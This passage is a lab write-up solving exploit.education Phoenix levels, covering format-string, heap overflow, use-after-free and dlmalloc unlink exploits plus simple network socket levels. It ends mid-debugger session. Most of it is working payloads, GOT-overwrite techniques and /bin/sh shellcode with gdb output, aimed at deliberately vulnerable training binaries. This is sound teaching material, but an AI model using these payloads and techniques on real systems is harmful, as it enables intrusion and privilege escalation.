user@phoenix-amd64:~$ /opt/phoenix/i486/format-one
Welcome to phoenix/format-one, brought to you by https://exploit.education
%032xAAAA
Uh oh, 'changeme' is not the magic value, it is 0x41414141
user@phoenix-amd64:~$ /opt/phoenix/i486/format-one
Welcome to phoenix/format-one, brought to you by https://exploit.education
%032xlOvE
Well done, the 'changeme' variable has been changed correctly!
</code></pre></div></div>

<h3 id="format-two">Format Two</h3>
<p>This one prints on stdout instead of a buffer, so a different approach is required.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void bounce(char *str) {
  printf(str);
}
</code></pre></div></div>
<p>Values on stack may be treated as further parameters for <code class="highlighter-rouge">printf</code>, so it would be easy to exploit if user input appeared somewhere there.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ gdb /opt/phoenix/i486/format-two
gef➤  disas bounce
   [...]
   0x08048521 &lt;+12&gt;:    call   0x8048320 &lt;printf@plt&gt;
   [...]
End of assembler dump.
gef➤  b *bounce+12
Breakpoint 1 at 0x8048521
gef➤  r AAAA
Starting program: /opt/phoenix/i486/format-two AAAA
Welcome to phoenix/format-two, brought to you by https://exploit.education

Breakpoint 1, 0x08048521 in bounce ()
gef➤  x/16x $esp
0xffffd000:     0xffffd030      0xffffd31a      0x00000100      0x00000000
0xffffd010:     0xf7f84b67      0xffffd150      0xffffd138      0x080485a0
0xffffd020:     0xffffd030      0xffffd31a      0x00000100      0x000003e8
0xffffd030:     0x41414141      0x00000000      0x00000000      0x00000000
</code></pre></div></div>
<p>Our value appears at <code class="highlighter-rouge">0xffffd030</code> which is 13th parameter of <code class="highlighter-rouge">printf</code>, so instead of <code class="highlighter-rouge">0x41414141</code> we may put there any address to which we want write.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  print &amp;changeme
$1 = (&lt;data variable, no debug info&gt; *) 0x8049868 &lt;changeme&gt;
</code></pre></div></div>

<p>So we put this address on the stack, then we skip next 11 elements (not 12, because first is skipped already - it’s address of a string), and the last part - <code class="highlighter-rouge">%n</code> writes to that address.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ /opt/phoenix/i486/format-two `python -c 'print "\x68\x98\x04\x08" + "%08x_" * 11 + "%n"'`
Welcome to phoenix/format-two, brought to you by https://exploit.education
hffffd2ec_00000100_00000000_f7f84b67_ffffd120_ffffd108_080485a0_ffffd000_ffffd2ec_00000100_000003e8_Well done, the 'changeme' variable has been changed correctly!
</code></pre></div></div>

<h3 id="format-three">Format Three</h3>
<p>Here instead of writing any value, a specific one must be set.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (changeme == 0x64457845) {
</code></pre></div></div>

<p>Solution is similar, we put desired address on stack.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ gdb /opt/phoenix/i486/format-three
gef➤  b *bounce+12
Breakpoint 1 at 0x80484f1
gef➤  r
Starting program: /opt/phoenix/i486/format-three
Welcome to phoenix/format-three, brought to you by https://exploit.education
AAAABBBBCCCCDDDD

Breakpoint 1, 0x080484f1 in bounce ()
gef➤  x/16x $esp
0xffffc0f0:     0xffffc120      0x00000000      0x00000000      0x00000000
0xffffc100:     0xf7f81cf7      0xf7ffb000      0xffffd128      0x08048556
0xffffc110:     0xffffc120      0xffffc120      0x00000fff      0x00000000
0xffffc120:     0x41414141      0x42424242      0x43434343      0x44444444
</code></pre></div></div>

<p>Position of input data is the same - it starts from 13th parameter.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  print &amp;changeme
$1 = (&lt;data variable, no debug info&gt; *) 0x8049844 &lt;changeme&gt;
</code></pre></div></div>

<p>So we put <code class="highlighter-rouge">changeme</code> address increased by 2, then any address, then <code class="highlighter-rouge">changeme</code> again but without any modification. Then we print <code class="highlighter-rouge">"%2565x" * 10 + "%4x"</code> next 11 elements from stack, usage of length specifiers sets byte counter to <code class="highlighter-rouge">0x6445</code>. Using <code class="highlighter-rouge">%hn</code> 2 bytes from counter (instead of 4 bytes for <code class="highlighter-rouge">%n</code>) are written to specified address.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ echo `python -c 'print "\x46\x98\x04\x08\xff\xff\xff\xff\x44\x98\x04\x08aaa" + "%2565x" * 10 + "%4x" + "%hn"'` | /opt/phoenix/i486/format-three
Welcome to phoenix/format-three, brought to you by https://exploit.education
[...]
Better luck next time - got 0x64450000, wanted 0x64457845!
</code></pre></div></div>

<p>Then, more bytes are printed <code class="highlighter-rouge">%5120x</code> to reach <code class="highlighter-rouge">0x7845</code> in counter.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ echo `python -c 'print "\x46\x98\x04\x08\xff\xff\xff\xff\x44\x98\x04\x08aaa" + "%2565x" * 10 + "%4x" + "%hn%5120x%hn"'` | /opt/phoenix/i486/format-three
Welcome to phoenix/format-three, brought to you by https://exploit.education
[...]
Well done, the 'changeme' variable has been changed correctly!
</code></pre></div></div>

<h3 id="format-four">Format Four</h3>
<p>Last format exercise requires changing execution flow. It can be done by using how <code class="highlighter-rouge">exit</code> is called. Its address is kept in <code class="highlighter-rouge">.plt</code> which we can try to override. More details about this technique:</p>
<ul>
  <li><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a></li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ python -c 'print "A" * 16' &gt; /tmp/a
user@phoenix-amd64:~$ gdb /opt/phoenix/i486/format-four
gef➤  b *bounce+17
Breakpoint 1 at 0x80484f6
gef➤  r &lt; /tmp/a
Starting program: /opt/phoenix/i486/format-four &lt; /tmp/a
Welcome to phoenix/format-four, brought to you by https://exploit.education

Breakpoint 1, 0x080484f6 in bounce ()
gef➤  x/16x $esp
0xffffc110:     0xffffc140      0x00000000      0x00000000      0x00000000
0xffffc120:     0xf7f81cf7      0xf7ffb000      0xffffd148      0x0804857d
0xffffc130:     0xffffc140      0xffffc140      0x00000fff      0x00000000
0xffffc140:     0x41414141      0x41414141      0x41414141      0x41414141
</code></pre></div></div>
<p>As in the previous exercises, user input starts from 13th parameter.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  disas main
   [...]
   0x08048569 &lt;+70&gt;:    call   0x8048330 &lt;exit@plt&gt;
   [...]
gef➤  x/i 0x8048330
0x8048330 &lt;exit@plt&gt;:        jmp    DWORD PTR ds:0x80497e4
gef➤  x/x 0x80497e4
0x80497e4 &lt;exit@got.plt&gt;:       0xf7f7f543
</code></pre></div></div>
<p>Address of <code class="highlighter-rouge">exit</code> function (<code class="highlighter-rouge">0xf7f7f543</code>) is kept at <code class="highlighter-rouge">0x80497e4</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  print &amp;congratulations
$1 = (&lt;text variable, no debug info&gt; *) 0x8048503 &lt;congratulations&gt;
</code></pre></div></div>

<p>We would like to write <code class="highlighter-rouge">0x8048503</code> value at <code class="highlighter-rouge">0x80497e4</code> to replace real <code class="highlighter-rouge">exit</code> address. Payload can be prepared using the same technique as before.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'print "\xe6\x97\x04\x08\xff\xff\xff\xff\xe4\x97\x04\x08" + "%202x-"*10 + "%10x" + "%hn%31999x%hn"' &gt; input.txt
user@phoenix-amd64:~$ cat input.txt | /opt/phoenix/i486/format-four
[...]
Well done, you're redirected code execution!
[...]
</code></pre></div></div>

<p>Execution was redirected, but more interesting is executing own code. So instead of writing <code class="highlighter-rouge">congratulations</code> address, we will write an address of a buffer containing shellcode.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ python -c 'print "\xe4\x97\x04\x08\xff\xff\xff\xff\xe5\x97\x04\x08\xff\xff\xff\xff\xe6\x97\x04\x08\xe7\x97\x04\x08" + "%x"*10 + "%99x" + "%hhn%16x%hhn%63x%hhn%hhn" + "A" * 8' &gt; input2.txt
user@phoenix-amd64:~$ gdb /opt/phoenix/i486/format-four
gef➤  b *bounce+17
Breakpoint 1 at 0x80484f6
gef➤  r &lt; /tmp/a
Starting program: /opt/phoenix/i486/format-four &lt; /tmp/a
Welcome to phoenix/format-four, brought to you by https://exploit.education

Breakpoint 1, 0x080484f6 in bounce ()
gef➤  grep AAAAAAAA
[+] Searching 'AAAAAAAA' in memory
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rwx
  0xffffc0a8 - 0xffffc0af  →   "AAAAAAAA[...]"
</code></pre></div></div>

<p>This time payload will write bytes one by one (using <code class="highlighter-rouge">%hhn</code>), pointing just after “AAAAAAAA” - <code class="highlighter-rouge">0xffffc0b0</code>. Shellcode will be the same as from stack 5 exercise.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ python -c 'print "\xe4\x97\x04\x08\xff\xff\xff\xff\xe5\x97\x04\x08\xff\xff\xff\xff\xe6\x97\x04\x08\xe7\x97\x04\x08" + "%x"*10 + "%99x" + "%hhn%16x%hhn%63x%hhn%hhn" + "A" * 8 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' &gt; input2.txt
user@phoenix-amd64:~$ /opt/phoenix/i486/format-four &lt; input2.txt
Welcome to phoenix/format-four, brought to you by https://exploit.education
[...]
$ id
uid=1000(user) gid=1000(user) euid=511(phoenix-i386-format-four) egid=511(phoenix-i386-format-four) groups=511(phoenix-i386-format-four),27(sudo),1000(user)
</code></pre></div></div>

<h2 id="heap">Heap</h2>

<p>This part is focused on exploitation heap memory corruption.</p>

<h3 id="heap-zero">Heap Zero</h3>
<p>The application allocates memory for <code class="highlighter-rouge">struct data</code> and <code class="highlighter-rouge">struct fp</code> on heap. Then, without any length verification copies user input to fixed length buffer in <code class="highlighter-rouge">struct data</code>.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>struct data {
  char name[64];
};

struct fp {
  void (*fp)();
  char __pad[64 - sizeof(unsigned long)];
};

[...]

int main(int argc, char **argv) {
  [...]
  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f-&gt;fp = nowinner;

  strcpy(d-&gt;name, argv[1]);
</code></pre></div></div>
<p>The goal is to overwrite <code class="highlighter-rouge">f-&gt;fp</code> pointer. 
We need to check a distance between end of <code class="highlighter-rouge">buffer</code> and <code class="highlighter-rouge">fp</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ gdb /opt/phoenix/i486/heap-zero
gef➤  disas main
   [...]
   0x080488af &lt;+72&gt;:    call   0x8049146 &lt;malloc&gt;
   0x080488b4 &lt;+77&gt;:    add    esp,0x10
   0x080488b7 &lt;+80&gt;:    mov    DWORD PTR [ebp-0xc],eax
   0x080488ba &lt;+83&gt;:    sub    esp,0xc
   0x080488bd &lt;+86&gt;:    push   0x40
   0x080488bf &lt;+88&gt;:    call   0x8049146 &lt;malloc&gt;
   0x080488c4 &lt;+93&gt;:    add    esp,0x10
   0x080488c7 &lt;+96&gt;:    mov    DWORD PTR [ebp-0x10],eax
   0x080488ca &lt;+99&gt;:    mov    eax,DWORD PTR [ebp-0x10]
   [...]
=&gt; 0x080488e3 &lt;+124&gt;:   call   0x80485b0 &lt;strcpy@plt&gt;
   [...]
End of assembler dump.
gef➤  b *main+124
Breakpoint 1 at 0x80488e3
gef➤  r AAAA
Starting program: /opt/phoenix/i486/heap-zero AAAA
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
</code></pre></div></div>
<p>We check value of <code class="highlighter-rouge">d</code> (<code class="highlighter-rouge">ebp-0x10</code>) and <code class="highlighter-rouge">f</code> (<code class="highlighter-rouge">ebp-0xc</code>), and a distance between them.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Breakpoint 1, 0x080488e3 in main ()
gef➤  x/x $ebp-0x10
0xffffcff8:     0xf7e69050
gef➤  x/x $ebp-0xc
0xffffcffc:     0xf7e69008
gef➤  print/d  0xf7e69050 - 0xf7e69008
$5 = 72
</code></pre></div></div>

<p>So sending more than 72 bytes should override the function pointer <code class="highlighter-rouge">fp</code>. Let’s check it with <code class="highlighter-rouge">74 * "A" + "BBBB"</code></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Starting program: /opt/phoenix/i486/heap-zero AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x42424242

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
</code></pre></div></div>

<p>It works, so <code class="highlighter-rouge">BBBB</code> can be replaced with a desired address.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  print &amp;winner
$6 = (&lt;text variable, no debug info&gt; *) 0x8048835 &lt;winner&gt;
</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ /opt/phoenix/i486/heap-zero `python -c "print 'A' * 72 + '\x35\x88\x04\x08'"`
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x8048835
Congratulations, you have passed this level
</code></pre></div></div>

<h3 id="heap-one">Heap One</h3>

<p>In this exercise we can overwrite objects on a heap, but this time no function pointer is in use.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
struct heapStructure {
  int priority;
  char *name;
};
[...]

  strcpy(i1-&gt;name, argv[1]);
  strcpy(i2-&gt;name, argv[2]);

  printf("and that's a wrap folks!\n");
[...]
</code></pre></div></div>
<p>We can exploit the fact that <code class="highlighter-rouge">strcpy</code> is called twice, for two objects on the heap. It is possible to abuse first invocation to overflow a buffer <code class="highlighter-rouge">i1-&gt;name</code> and overwrite value in <code class="highlighter-rouge">i2.name</code>. Next, a second user controlled parameter is written to <code class="highlighter-rouge">i2-&gt;name</code>, and as we may control to which address <code class="highlighter-rouge">name</code> points we can write any value to any address. We just need to know an offset for overflow and an address where <code class="highlighter-rouge">printf</code> kept by <code class="highlighter-rouge">.plt</code>.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ gdb /opt/phoenix/i486/heap-one
gef➤  disas main
Dump of assembler code for function main:
   [...]
   0x0804884d &lt;+120&gt;:   mov    eax,DWORD PTR [ebp-0xc]
   0x08048850 &lt;+123&gt;:   mov    eax,DWORD PTR [eax+0x4]
   0x08048853 &lt;+126&gt;:   sub    esp,0x8
   0x08048856 &lt;+129&gt;:   push   edx
   0x08048857 &lt;+130&gt;:   push   eax
   0x08048858 &lt;+131&gt;:   call   0x8048560 &lt;strcpy@plt&gt;
   [...]
   0x08048868 &lt;+147&gt;:   mov    eax,DWORD PTR [ebp-0x10]
   0x0804886b &lt;+150&gt;:   mov    eax,DWORD PTR [eax+0x4]
   0x0804886e &lt;+153&gt;:   sub    esp,0x8
   0x08048871 &lt;+156&gt;:   push   edx
   0x08048872 &lt;+157&gt;:   push   eax
   0x08048873 &lt;+158&gt;:   call   0x8048560 &lt;strcpy@plt&gt;
   [...]
gef➤  b *main+131
Breakpoint 1 at 0x8048858
</code></pre></div></div>

<p><code class="highlighter-rouge">ebp-0xc</code> is <code class="highlighter-rouge">i1</code> and <code class="highlighter-rouge">ebp-0x10</code> is <code class="highlighter-rouge">i2</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/x $ebp-0xc
0xffffd11c:     0xf7e69008
gef➤  x/x 0xf7e69008 + 4
0xf7e6900c:     0xf7e69018
gef➤  x/x $ebp-0x10
0xffffd118:     0xf7e69028
gef➤  print/x 0xf7e69028+0x4
$0 = 0xf7e6902c
gef➤  print/d 0xf7e6902c-0xf7e69018
$1 = 20
gef➤  print &amp;winner
$3 = (&lt;text variable, no debug info&gt; *) 0x804889a &lt;winner&gt;
</code></pre></div></div>

<p>Joining it together.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ /opt/phoenix/i486/heap-one `python -c 'print "A"*20 + "\x40\xc1\x04\x08"'` `python -c 'print "\x9a\x88\x04\x08"'`
Congratulations, you've completed this level @ 1572169324 seconds past the Epoch
</code></pre></div></div>

<h3 id="heap-two">Heap Two</h3>
<p>Here we have possibility to exploit use after free kind of bug, which will allow us to pass authentication.
When <code class="highlighter-rouge">free</code> is called the application still uses freed memory, and this address may be additionally reused by <code class="highlighter-rouge">strdup</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ /opt/phoenix/i486/heap-two
Welcome to phoenix/heap-two, brought to you by https://exploit.education
[ auth = 0, service = 0 ]
auth a
[ auth = 0x8049af0, service = 0 ]
reset
[ auth = 0x8049af0, service = 0 ]
service aaaaaa
[ auth = 0x8049af0, service = 0x8049af0 ]
login
you have logged in already!
[ auth = 0x8049af0, service = 0x8049af0 ]
</code></pre></div></div>

<h3 id="heap-three">Heap Three</h3>

<p>Good explanation what happens here:</p>
<ul>
  <li><a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-heap-three-solution/">https://blog.lamarranet.com/index.php/exploit-education-phoenix-heap-three-solution/</a></li>
  <li><a href="https://www.lucas-bader.com/ctf/2019/05/02/heap3">https://www.lucas-bader.com/ctf/2019/05/02/heap3</a></li>
</ul>

<p>Important parts of code:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define MAX_FAST_SIZE     80

[...]

#define chunk_at_offset(p, s)  ((mchunkptr)(((char*)(p)) + (s)))

[...]

#define unlink(P, BK, FD) {                                            \
  FD = P-&gt;fd;                                                          \
  BK = P-&gt;bk;                                                          \
  FD-&gt;bk = BK;                                                         \
  BK-&gt;fd = FD;                                                         \
}

[...]

struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
};

[...]

  if ((CHUNK_SIZE_T)(size) &lt;= (CHUNK_SIZE_T)(av-&gt;max_fast)

[...]

  if (!prev_inuse(p)) {
        prevsize = p-&gt;prev_size;
        size += prevsize;
        p = chunk_at_offset(p, -((long) prevsize));
        unlink(p, bck, fwd);
  }
</code></pre></div></div>

<p>Addresses of user data in chunks (returned by <code class="highlighter-rouge">malloc</code>):
a - <code class="highlighter-rouge">0xf7e69008</code>
b - <code class="highlighter-rouge">0xf7e69030</code>
c - <code class="highlighter-rouge">0xf7e69058</code></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/i 0x80485b0
   0x80485b0 &lt;puts@plt&gt;:        jmp    DWORD PTR ds:0x804c13c
gef➤  x/x 0x804c13c
0x804c13c &lt;puts@got.plt&gt;:       0xf7fb88ee

gef➤  print winner
$15 = {&lt;text variable, no debug info&gt;} 0x80487d5 &lt;winner&gt;
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A = "aaaa" # anything, skipped
A += "\xb8\xd5\x87\x04\x08\xff\xe0" # shellcode: mov eax, 0x080487d5; jmp eax

B = "B"*32
B += "\xfc\xff\xff\xff"
B += "\xb0\xff\xff\xff"

C = "XXXX" # anything, skipped
C += "\x30\xc1\x04\x08" # address of puts@got.plt - 12 bytes
C += "\x0c\x90\xe6\xf7" # address of shellcode

print A + " " + B + " " + C
</code></pre></div></div>

<p>As a second argument more than 32 bytes are passed. First exceeding 4 bytes overwrites <code class="highlighter-rouge">prev_size</code> in chunk C. <code class="highlighter-rouge">prev_size</code> value is treated as a signed long (<code class="highlighter-rouge">0xfffffffc</code> -&gt; <code class="highlighter-rouge">4294967292</code> -&gt; <code class="highlighter-rouge">-4</code>) and negated what makes it <code class="highlighter-rouge">4</code>. Then, this value is added to a current chunk’s address (<code class="highlighter-rouge">0xf7e69050</code>) what makes <code class="highlighter-rouge">p</code> (<code class="highlighter-rouge">0xf7e69054</code>). In <code class="highlighter-rouge">unlink</code>: to <code class="highlighter-rouge">FD</code> value <code class="highlighter-rouge">0x0804c130</code> is set, and <code class="highlighter-rouge">0xf7e6900c</code> to <code class="highlighter-rouge">BK</code>. Next, <code class="highlighter-rouge">FD.bk</code> points to <code class="highlighter-rouge">0x804c13c</code> address which keeps a pointer to <code class="highlighter-rouge">puts</code>. This pointer is overwritten with <code class="highlighter-rouge">BK</code> (<code class="highlighter-rouge">0xf7e6900c</code>) which is an address of the shellcode. <code class="highlighter-rouge">BK.fd</code> points to <code class="highlighter-rouge">0xf7e69014</code> - to this address <code class="highlighter-rouge">FD</code> value is written, and it would broke the exploit if the shellcode was 9 or more bytes long. Second exceeding 4 bytes allow to pass initial size check (before <code class="highlighter-rouge">unlink</code> is executed) as <code class="highlighter-rouge">0xffffffb0</code> becomes <code class="highlighter-rouge">4294967216</code> which is more than max size for fastbin.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  b *free
Breakpoint 1 at 0x8049857
gef➤  b *main+187
Breakpoint 2 at 0x80488b7

gef➤  r $(python th.py)
Starting program: /opt/phoenix/i486/heap-three $(python heap-three.py)

Breakpoint 1, 0x08049857 in free ()
gef➤  x/32x 0xf7e69000
0xf7e69000:     0x00000000      0x00000029      0x61616161      0x0487d5b8
0xf7e69010:     0x00e0ff08      0x00000000      0x00000000      0x00000000
0xf7e69020:     0x00000000      0x00000000      0x00000000      0x00000029
0xf7e69030:     0x42424242      0x42424242      0x42424242      0x42424242
0xf7e69040:     0x42424242      0x42424242      0x42424242      0x42424242
0xf7e69050:     0xfffffffc      0xffffffb0      0x58585858      0x0804c130
0xf7e69060:     0xf7e6900c      0x00000000      0x00000000      0x00000000
0xf7e69070:     0x00000000      0x00000000      0x00000000      0x000fff89
gef➤  x/x 0x804c13c
0x804c13c &lt;puts@got.plt&gt;:       0xf7fb88ee
gef➤
Continuing.

Breakpoint 2, 0x080488b7 in main ()
gef➤  x/32x 0xf7e69000
0xf7e69000:     0xffffffac      0x00000028      0xf7e69028      0x0487d5b8
0xf7e69010:     0x00e0ff08      0x0804c130      0x00000000      0x00000000
0xf7e69020:     0x00000000      0x00000000      0x00000000      0x00000029
0xf7e69030:     0x00000000      0x42424242      0x42424242      0x42424242
0xf7e69040:     0x42424242      0x42424242      0x42424242      0x42424242
0xf7e69050:     0xfffffffc      0xffffffb0      0xffffffad      0x0804c1f4
0xf7e69060:     0x0804c1f4      0x00000000      0x00000000      0x00000000
0xf7e69070:     0x00000000      0x00000000      0x00000000      0x000fff89
gef➤  x/x 0x804c13c
0x804c13c &lt;puts@got.plt&gt;:       0xf7e6900c
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ /opt/phoenix/i486/heap-three `python heap-three.py`
Level was successfully completed at @ 1572295810 seconds past the Epoch
</code></pre></div></div>

<h2 id="net">Net</h2>
<h3 id="net-zero">Net Zero</h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket
import time
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 64010))
while True:
    t = s.recv(128)
    print t
    n = t.split("'")
    if len(n) &gt; 1:
        n = n[1]
        print "Received: " + n + " (hex: " + "".join("\\x{:02x}".format(ord(c)) for c in n) + ")"
        u = struct.pack("&lt;I", int(n))
        print "As unsigned int (hex): " + "".join("\\x{:02x}".format(ord(c)) for c in u)
        s.send(u)
        time.sleep(0.5)
        print s.recv(64)
        break

</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to phoenix/net-zero, brought to you by https://exploit.education
Please send '1658418750' as a little endian, 32bit inte
Received: 1658418750 (hex: \x31\x36\x35\x38\x34\x31\x38\x37\x35\x30)
As unsigned int (hex): \x3e\x76\xd9\x62
ger.
You have successfully passed this level, well done!
</code></pre></div></div>

<p>The application sends the number written as string (ascii). It must be converted to a number and then to bytes with little endian order.</p>

<h3 id="net-one">Net One</h3>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket
import time
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 64011))
time.sleep(0.5)
t = s.recv(128)
print t
n = t.split("\n")[1]
print "Received: " + "".join("\\x{:02x}".format(ord(c)) for c in n)
c = str(struct.unpack("&lt;I", n)[0])
print "As unsigned int: " + c
s.send(c + "\r\n")
time.sleep(0.5)
print s.recv(128)
</code></pre></div></div>

<p>The application sends the number encoded as bytes in little endian order. It must be converted to int, then to string and sent back.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ python n1.py
Welcome to phoenix/net-one, brought to you by https://exploit.education
ߋ�x
Received: \xdf\x8b\x92\x78
As unsigned int: 2022869983
Congratulations, you've passed this level!
</code></pre></div></div>

<h3 id="net-two">Net Two</h3>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket
import time
import struct


def ashex(b):
    return "".join("\\x{:02x}".format(ord(c)) for c in b)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 64012))
i = ""
while True:
    i += s.recv(128)
    if i[-1] == "\n":
        break

total = 0
for i in range(0,4):
    a = s.recv(4)
    print "Received: " + ashex(a)
    total = long(total + struct.unpack("&lt;L", a)[0])

total = total &amp; 0xffffffff
p = struct.pack("&lt;L", total)
print "Total: " + str(total) + ", hex: " + ashex(str(p))
s.send(p)
time.sleep(0.5)
print s.recv(1024)
</code></pre></div></div>

<p>This time the application sends 4 longs which must be summed up and sent back. As numeric values don’t overflow in python, we must remove exceeding bytes.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@phoenix-amd64:~$ python n2.py
Received: \x1e\x0e\x86\x96
Received: \xcc\x0a\x7d\x4c
Received: \xfb\x8d\xb5\x45
Received: \xe4\xfd\xf9\x78
Total: 2712839369, hex: \xc9\xa4\xb2\xa1
You have successfully passed this level, well done!
</code></pre></div></div>

<h2 id="final">Final</h2>
<h3 id="final-zero">Final Zero</h3>
<p>This final exercise is very similar to the <em>stack five</em> exercise, but this time we communicate over a network. We can create a pattern which helps in finding an offset and cause a crash just using a <code class="highlighter-rouge">nc</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# msf-pattern_create -l 600
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@phoenix-amd64:/var/lib/coredumps# gdb -c core.final-zero.11.7752

Core was generated by `/opt/phoenix/i486/final-zero'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x72413772 in ?? ()

gef➤  x/s 0xffffdb18
